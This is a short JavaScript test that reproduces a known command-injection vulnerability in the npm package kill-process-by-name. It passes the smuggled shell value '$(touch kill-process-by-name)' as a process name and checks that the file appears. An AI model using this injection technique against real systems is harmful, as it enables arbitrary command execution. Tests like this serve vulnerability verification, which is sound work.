//https://snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534
test("Command Injection in kill-process-by-name", () => 
{
    const kill_process_by_name = require('kill-process-by-name');
	const fs = require('fs')
	const path = './kill-process-by-name'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    kill_process_by_name('$(touch kill-process-by-name)');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
